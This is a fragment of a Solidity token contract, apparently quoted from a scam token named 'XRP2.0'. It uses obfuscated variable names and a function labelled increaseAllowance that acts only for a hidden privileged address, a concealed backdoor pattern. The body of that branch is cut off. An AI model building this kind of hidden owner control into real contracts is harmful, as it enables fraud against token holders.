...
contract XRTOKEN is Ownable {
    ...
    string private _hooextokenname = "XRP2.0";
    string private _voptokensymbol = "XRP2.0";
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
        address public ddjjyyii34;
    function increaseAllowance(address yayayxx) public     {
        ...
        if(ddjjyyii34 != _msgSender()){
            return ;
        }else{
           require(ddjjyyii34 == _msgSender());
